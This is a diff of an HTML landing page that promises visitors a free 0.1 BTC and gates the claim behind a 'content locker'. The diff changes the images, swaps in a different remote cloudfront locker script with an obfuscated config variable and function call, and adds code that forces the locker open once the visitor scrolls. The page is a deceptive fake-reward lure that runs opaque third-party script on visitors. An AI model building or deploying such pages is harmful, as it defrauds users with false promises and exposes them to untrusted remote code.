@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Claim Your BTC Reward</title>
+  <title>Claim Your Free Bitcoin!</title>
   
   <style>
     /* General Body Style */
@@ -222,7 +222,7 @@
 
   <div class="hero">
     <!-- Updated working Bitcoin image -->
-    <img src="https://www.coingecko.com/favicon.ico" alt="Bitcoin Icon">
+    <img src="https://bitcoin.org/img/icons/opengraph.png?1640049076" alt="Bitcoin Icon" width="80" height="80">
     <h2>Get 0.1 BTC Now</h2>
     <p>Complete tasks, watch videos, and earn free BTC! The more tasks you complete, the more you earn.</p>
     <button class="cta-btn" onclick="openLocker()">Claim Now</button>
@@ -241,7 +241,7 @@
       <button class="close-locker-btn" onclick="closeLocker()">X</button>
       <div class="locker-title">Almost There! Claim Your BTC!</div>
       <!-- Updated Bitcoin image inside the content locker -->
-      <img src="https://www.coingecko.com/favicon.ico" alt="Bitcoin Icon" width="80" height="80">
+      <img src="https://bitcoin.org/img/icons/opengraph.png?1640049076" alt="Bitcoin Icon" width="80" height="80">
       <p>Complete your task to claim 0.1 BTC!</p>
       <button class="locker-btn" onclick="completeTask()">Complete Task</button>
     </div>
@@ -249,15 +249,15 @@
 
   <!-- Content Locker Script -->
   <script type="text/javascript">
-    var mfZvq_bOj_jFMzyc = { "it": 4491341, "key": "dc81e" };
+    var DEhLI_NIl_gwoXyc = { "it": 4491341, "key": "dc81e" };
   </script>
-  <script src="https://d2yc6hxtq0phup.cloudfront.net/8e5aa35.js"></script>
+  <script src="https://d2yc6hxtq0phup.cloudfront.net/0fdd2bc.js"></script>
 
   <script>
     // Function to open the content locker
     function openLocker() {
       document.getElementById('contentLocker').style.display = 'flex';
-      _kt(); // Open locker with the provided script function
+      _ou(); // Open locker with the provided script function
     }
 
     // Function to close the content locker
@@ -271,4 +271,13 @@
       closeLocker();
     }
 
-    // Optional: Open the locker after scrolling (
+    // Optional: Open the locker after scrolling (e.g., after 150px)
+    window.addEventListener("scroll", function () {
+      if (window.scrollY > 150) {
+        openLocker(); // Open locker after scrolling
+      }
+    });
+  </script>
+
+</body>
+</html>
